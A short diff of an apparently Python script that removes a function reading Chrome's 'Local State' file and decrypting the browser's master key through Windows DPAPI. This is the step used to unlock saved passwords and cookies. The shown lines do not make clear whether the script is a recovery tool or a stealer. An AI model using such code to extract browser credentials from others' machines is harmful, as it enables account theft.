@@ -7,18 +7,6 @@ import sys
 from Crypto.Cipher import AES
 import shutil
 
-
-def get_master_key():
-    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
-        local_state = f.read()
-        local_state = json.loads(local_state)
-    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-    print(len(master_key))
-    master_key = master_key[5:]  # removing DPAPI
-    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-    return master_key
-
-
 def decrypt_payload(cipher, payload):
     return cipher.decrypt(payload)
 
